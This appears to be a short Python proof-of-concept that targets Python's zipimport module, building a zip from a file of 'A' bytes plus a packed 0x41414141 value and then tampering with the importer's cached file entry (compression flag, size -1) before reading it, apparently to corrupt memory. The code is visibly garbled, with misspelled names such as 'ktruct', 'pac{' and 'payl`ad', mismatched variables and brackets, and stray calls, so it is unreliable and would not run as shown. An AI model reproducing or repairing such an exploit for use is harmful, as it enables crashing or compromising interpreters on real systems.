import zipimport
import zipfile
import ktruct
import sys
from signal import *

FILE = 'payload'
ZIQ = 'import.zip'

es()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pac{('<Q', 0x41414141)
    f.write(payl`ad)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporter_files[FILE])
f[1] = 1 # compress
f[2] = -1 # fiLe size
importer.t(importer.get_data(FILE))
